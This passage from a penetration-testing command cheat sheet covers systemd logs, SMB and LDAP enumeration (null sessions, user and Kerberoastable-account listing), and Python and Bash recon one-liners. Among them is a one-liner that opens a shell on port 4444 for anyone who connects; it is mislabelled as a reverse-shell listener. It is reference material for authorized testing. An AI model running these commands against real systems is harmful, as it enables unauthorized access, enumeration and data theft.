systemctl list-dependencies <service>

# Reload systemd configuration
systemctl daemon-reload

# System control
systemctl poweroff
systemctl reboot
systemctl suspend

# Journal/logs
systemctl show <service> -p MainPID
```

---

### journalctl

Query and display systemd journal logs.

```bash
# All logs
journalctl

# Follow (tail -f equivalent)
journalctl -f

# Specific service
journalctl -u ssh
journalctl -u nginx -f

# Since time
journalctl --since "2026-03-01 00:00:00"
journalctl --since "1 hour ago"
journalctl --since today

# Between times
journalctl --since "2026-03-01" --until "2026-03-02"

# By priority
journalctl -p err                     # Errors and above
journalctl -p warning                 # Warnings and above
# Priorities: emerg, alert, crit, err, warning, notice, info, debug

# Kernel messages
journalctl -k

# Boot logs
journalctl -b                        # Current boot
journalctl -b -1                     # Previous boot
journalctl --list-boots              # List all boots

# Output formats
journalctl -o json-pretty
journalctl -o short-precise

# Disk usage
journalctl --disk-usage

# Vacuum (clean old logs)
journalctl --vacuum-time=7d
journalctl --vacuum-size=500M

# By PID
journalctl _PID=1234

# Grep-like filtering
journalctl -u ssh | grep "Failed"
journalctl --grep="error|fail" --since today
```

---

## 14. Enumeration

### enum4linux / enum4linux-ng

Windows/Samba enumeration tool. Wraps rpcclient, net, nmblookup, smbclient.

**Key Flags (enum4linux):**

```
-a          All enumeration (default set)
-U          User list
-S          Share list
-G          Group list
-P          Password policy
-M          Machine list
-d          Detailed (verbose)
-r          RID cycling
-u          Username for auth
-p          Password for auth
-w          Workgroup
```

**Examples:**

```bash
# Full enumeration (null session)
enum4linux -a 192.168.1.1

# User enumeration
enum4linux -U 192.168.1.1

# Share enumeration
enum4linux -S 192.168.1.1

# Password policy
enum4linux -P 192.168.1.1

# RID cycling
enum4linux -r 192.168.1.1

# With credentials
enum4linux -u admin -p password -a 192.168.1.1

# enum4linux-ng (Python rewrite)
enum4linux-ng -A 192.168.1.1
enum4linux-ng -A -u admin -p password 192.168.1.1 -oA output  # YAML+JSON output
```

---

### smbclient

FTP-like client for SMB/CIFS shares.

```bash
# List shares (null session)
smbclient -L //192.168.1.1 -N

# List shares with credentials
smbclient -L //192.168.1.1 -U admin

# Connect to share
smbclient //192.168.1.1/share -U admin

# Null session access
smbclient //192.168.1.1/share -N

# Commands inside smbclient session:
# ls, cd, get, put, mget, mput, mkdir, rmdir, del, exit

# Download file
smbclient //192.168.1.1/share -N -c "get file.txt"

# Download all files recursively
smbclient //192.168.1.1/share -N -c "recurse; prompt; mget *"

# Upload file
smbclient //192.168.1.1/share -U admin -c "put local_file.txt remote_file.txt"

# With domain
smbclient //192.168.1.1/share -U DOMAIN/admin%password
```

---

### rpcclient

MS-RPC client for enumerating Windows systems.

```bash
# Connect with null session
rpcclient -U "" -N 192.168.1.1

# Connect with credentials
rpcclient -U admin 192.168.1.1

# Common commands inside rpcclient:
enumdomusers               # List domain users
enumdomgroups              # List domain groups
queryuser <RID>            # User details by RID (e.g., 0x1f4 = 500 = Administrator)
querygroup <RID>           # Group details
querygroupmem <RID>        # Group members
getdompwinfo               # Password policy
lookupnames <name>         # Name to SID
lookupsids <SID>           # SID to name
lsaenumsid                 # Enumerate SIDs
querydispinfo              # User display info
netshareenumall            # List all shares
netsharegetinfo <share>    # Share details
srvinfo                    # Server info
enumprinters               # List printers

# One-liner
rpcclient -U "" -N 192.168.1.1 -c "enumdomusers"
rpcclient -U "" -N 192.168.1.1 -c "getdompwinfo"
```

---

### ldapsearch

LDAP directory query tool.

**Key Flags:**

```
-x          Simple authentication
-H          LDAP URI
-b          Search base DN
-D          Bind DN
-w          Bind password
-W          Prompt for password
-s          Scope (base, one, sub)
-LLL        Clean LDIF output (no comments, no version)
```

**Examples:**

```bash
# Anonymous bind, enumerate base
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com"

# Enumerate all users
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(objectClass=user)"

# Search specific user
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(sAMAccountName=admin)"

# With credentials
ldapsearch -x -H ldap://192.168.1.1 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# Enumerate groups
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(objectClass=group)" cn member

# Get specific attributes
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName mail

# LDAPS (SSL)
ldapsearch -x -H ldaps://192.168.1.1 -b "dc=example,dc=com"

# Get naming contexts (rootDSE)
ldapsearch -x -H ldap://192.168.1.1 -s base namingContexts

# Clean output
ldapsearch -x -H ldap://192.168.1.1 -b "dc=example,dc=com" -LLL "(objectClass=user)" cn

# Kerberoastable accounts
ldapsearch -x -H ldap://192.168.1.1 -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

---

## 15. Scripting

### Python3 One-Liners for Pentesting

```python
# Simple HTTP server (file sharing)
python3 -m http.server 8000
python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/serve

# Reverse shell listener (basic)
python3 -c "import socket,subprocess;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);c,a=s.accept();
import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# Port scanner
python3 -c "
import socket
target = '192.168.1.1'
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f'Port {port}: OPEN')
    s.close()
"

# URL encode/decode
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world & more'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('hello%20world%20%26%20more'))"

# Base64 encode/decode
python3 -c "import base64; print(base64.b64encode(b'hello').decode())"
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').decode())"

# MD5/SHA hash
python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"
python3 -c "import hashlib; print(hashlib.sha256(b'password').hexdigest())"

# Hex encode/decode
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"
python3 -c "print('Hello'.encode().hex())"

# DNS lookup
python3 -c "import socket; print(socket.gethostbyname('example.com'))"
python3 -c "import socket; print(socket.gethostbyaddr('8.8.8.8'))"

# HTTP request
python3 -c "
import urllib.request
r = urllib.request.urlopen('http://target.com')
print(r.status, r.read()[:500])
"

# JSON pretty print
python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2))" < data.json

# Subnet calculator
python3 -c "
import ipaddress
net = ipaddress.ip_network('192.168.1.0/24')
print(f'Network: {net.network_address}')
print(f'Broadcast: {net.broadcast_address}')
print(f'Hosts: {list(net.hosts())[:5]}...')
print(f'Total hosts: {net.num_addresses - 2}')
"

# ROT13
python3 -c "import codecs; print(codecs.decode('Uryyb Jbeyq', 'rot_13'))"

# XOR strings
python3 -c "
key = 0x42
data = b'Hello'
print(bytes([b ^ key for b in data]).hex())
"

# Generate wordlist permutations
python3 -c "
import itertools
chars = 'abc123'
for combo in itertools.product(chars, repeat=4):
    print(''.join(combo))
" > wordlist.txt

# Parse /etc/passwd
python3 -c "
for line in open('/etc/passwd'):
    parts = line.strip().split(':')
    if parts[6] not in ['/usr/sbin/nologin', '/bin/false']:
        print(f'{parts[0]} (UID:{parts[2]}) shell:{parts[6]}')
"
```

### Bash Automation Patterns

```bash
# Ping sweep
for i in $(seq 1 254); do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is alive" &
done
wait

# Port scan (bash only, no tools)
for port in 21 22 25 53 80 110 143 443 445 3306 3389 8080; do
    (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo "Port $port: OPEN"
done

# Service banner grab
for port in 21 22 25 80 110 143 443; do
    echo "" | timeout 2 nc -v 192.168.1.1 $port 2>&1 | head -2
done

# DNS zone transfer attempt on multiple nameservers
for ns in $(dig +short NS example.com); do
    echo "=== Trying $ns ==="
    dig @$ns example.com AXFR
done

# Check for common web paths
while read path; do
    code=$(curl -o /dev/null -s -w "%{http_code}" "http://target.com/$path")
    [ "$code" != "404" ] && echo "$code - /$path"
done < wordlist.txt

# Extract IPs from file
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' logfile.txt | sort -u

# Extract URLs from file
grep -oE 'https?://[^ "]+' page.html | sort -u

# Extract emails from file
grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' file.txt | sort -u

# Monitor new connections
watch -n 1 'ss -tnp | grep ESTAB'

# Automated nmap scan with output parsing
nmap -sV -oX - 192.168.1.0/24 | python3 -c "
import xml.etree.ElementTree as ET, sys
tree = ET.parse(sys.stdin)
for host in tree.findall('host'):
    ip = host.find('address').get('addr')
    for port in host.findall('.//port'):
        state = port.find('state').get('state')
        service = port.find('service')
        sname = service.get('name','') if service is not None else ''
        if state == 'open':
            print(f'{ip}:{port.get(\"portid\")} {sname}')
"

# Rotate user-agent for web requests
agents=("Mozilla/5.0" "curl/7.68" "Googlebot/2.1" "python-requests/2.28")
for agent in "${agents[@]}"; do
    curl -s -A "$agent" -o /dev/null -w "$agent -> %{http_code}\n" http://target.com
done

# Check multiple hosts for open SSH
while IFS= read -r host; do
    nc -z -w 2 "$host" 22 2>/dev/null && echo "$host: SSH open" || echo "$host: SSH closed"
done < hosts.txt

# Log all outbound connections with timestamps
while true; do
    ss -tnp | grep ESTAB | awk '{print strftime("%Y-%m-%d %H:%M:%S"), $0}'
    sleep 5
done >> connections.log

# Parallel command execution
cat hosts.txt | xargs -P 10 -I {} ssh {} "uname -a" 2>/dev/null

# Hash all files in directory (integrity check)
find /path/to/check -type f -exec sha256sum {} \; > baseline.sha256
# Later verify:
sha256sum -c baseline.sha256 2>/dev/null | grep FAILED
```

---

## Quick Reference: Common Wordlist Locations

```
/usr/share/wordlists/rockyou.txt              # Passwords (14M)
/usr/share/wordlists/dirb/common.txt          # Web directories (4.6K)
/usr/share/wordlists/dirb/big.txt             # Web directories (20K)
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # Web dirs (220K)
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt   # Web dirs (87K)
/usr/share/wordlists/dnsmap.txt               # DNS subdomains
/usr/share/wordlists/fasttrack.txt            # Quick password list
/usr/share/wordlists/metasploit/              # Metasploit wordlists
/usr/share/seclists/                          # SecLists collection
/usr/share/seclists/Usernames/Names/names.txt # Common usernames
/usr/share/seclists/Passwords/Common-Credentials/  # Common passwords
/usr/share/seclists/Discovery/Web-Content/    # Web content lists
/usr/share/seclists/Discovery/DNS/            # DNS subdomain lists
```

## Quick Reference: Default Ports

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote shell |
| 25 | SMTP | Email sending |
| 53 | DNS | Domain resolution |
| 80 | HTTP | Web traffic |
| 88 | Kerberos | Authentication |
| 110 | POP3 | Email retrieval |
| 111 | RPCbind | RPC portmapper |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | Windows file sharing |
| 143 | IMAP | Email retrieval |
| 389 | LDAP | Directory services |
| 443 | HTTPS | Encrypted web |
| 445 | SMB | Windows file sharing |
| 636 | LDAPS | Encrypted LDAP |
| 993 | IMAPS | Encrypted IMAP |
| 995 | POP3S | Encrypted POP3 |
| 1433 | MSSQL | Microsoft SQL Server |
| 1521 | Oracle | Oracle database |
| 2049 | NFS | Network file system |
| 3306 | MySQL | MySQL database |
| 3389 | RDP | Remote desktop |
| 5432 | PostgreSQL | PostgreSQL database |
| 5900 | VNC | Remote desktop |
| 5985 | WinRM | Windows remote mgmt |
| 6379 | Redis | Redis cache/DB |
| 8080 | HTTP-Alt | Alternative HTTP |
| 8443 | HTTPS-Alt | Alternative HTTPS |
| 8888 | HTTP-Alt | Alternative HTTP |
| 9200 | Elasticsearch | Search engine |
| 27017 | MongoDB | MongoDB database |

---

*Document generated 2026-03-21. For educational and authorized testing purposes only. Always obtain written permission before testing systems you do not own.*
